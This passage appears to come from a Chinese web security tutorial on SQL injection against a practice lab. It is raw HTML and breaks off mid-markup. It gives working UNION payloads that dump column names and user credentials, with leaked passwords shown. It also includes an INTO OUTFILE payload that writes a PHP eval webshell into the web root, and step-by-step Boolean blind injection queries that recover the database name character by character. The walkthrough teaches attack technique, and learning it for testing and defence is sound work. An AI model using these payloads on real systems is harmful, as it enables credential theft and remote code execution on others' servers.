&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select 1,2,group_concat(column_name ) from information_schema.columns where table_schema=database() and table_name = &#34;users&#34; %23&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Your Login name:2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Your Password:id,username,password #列名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=-1&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#查询 users 表里的 username 和 password&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Your Login name:&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Your Password:DumbDumb&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;AngelinaI&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;kill&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;you&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;Dummyp&lt;span class=&#34;token variable&#34;&gt;@ssword&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;securecrappy&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;stupidstupidity&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;supermangenious&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;batmanmob&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;le&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;adminadmin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;admin1admin1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;admin2admin2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;admin3admin3&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dhakkandumbo&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;admin4admin4&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;写webshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#写webshell&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;写 webshell&lt;/span&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;三个条件：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1.&lt;/span&gt;具有root权限。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;2.&lt;/span&gt;在数据库配置文件中的 配置项含有：secure_file_priv&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;（注意在数据库中此项默认为secure_file_priv&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;）。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;secure_file_prive&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 限制 mysqld 不允许导入导出&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;secure_file_priv&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;path&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 限制 mysqld 的导入导出只能发生在默认的 /path/ 目录下&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;secure_file_priv&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;’’  &lt;span class=&#34;token comment&#34;&gt;// 不对 mysqld 的导入 导出做限制&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;3.&lt;/span&gt;知道数据库的绝对路径。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt;函数可以导出多行，而&lt;span class=&#34;token keyword&#34;&gt;dumpfile&lt;/span&gt;只能导出一行数据&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt;函数在将数据写到文件里时有特殊的格式转换，而&lt;span class=&#34;token keyword&#34;&gt;dumpfile&lt;/span&gt;则保持原数据格式&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select 1,&#34;&amp;lt;?php @eval($_POST[&#39;&lt;/span&gt;cmd&#39;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;?&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;,3 into outfile &#34;&lt;/span&gt;D:\\Everyday&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;tools\\phpstudy_pro\\WWW\\www&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cn\\shell8&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&#34; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;boolean注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#boolean注入&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;Boolean 注入&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;布尔型盲注，页面不返回查询信息的数据，只能通过页面返回信息的真假条件判断是否存在注入.&lt;/p&gt;
&lt;p&gt;1, 报错&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;判断整数还是字符型&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;判断有没有注入&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt; 报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;判断字段数&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; order by 1 %23&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; order by 3 %23&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt; 报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;字段三个&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;爆数据库长度&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;length（）返回字符串长度&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;如果数据库长度大于等于表达式后面的数就返回正常 报错前面的那个数就是数据库长度&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and length(database())&gt;=4 %23 正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; length&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt; 正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and length(database())&gt;=7 %23 正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; length&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt; 正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and length(database())&gt;=9 %23 报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;数据库长度9&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;爆数据库名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;数据库名的范围一般在a~z、0~9之内，可能还会有特殊字符 &#34;_&#34;、&#34;-&#34; 等，这里的字母不区分大小写。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;定义和用法&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SUBSTR() 函数从字符串中提取子字符串（从任意位置开始）。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt; 报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and substr(database(),1,1)=&#34;b&#34; %23 报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt; 报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and substr(database(),1,1)=&#34;s&#34; %23 正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;第一个字符为s&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt; 报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and substr(database(),2,1)=&#34;b&#34; %23 报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt; 报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and substr(database(),2,1)=&#34;d&#34; %23 报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;e&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt; 正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;第二个字符为e替换&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;位置的&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;为&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;就可以爆破第三个字符以此类推爆出数据库名security&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ASCII码查询&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a 的ASCII码是&lt;span class=&#34;token 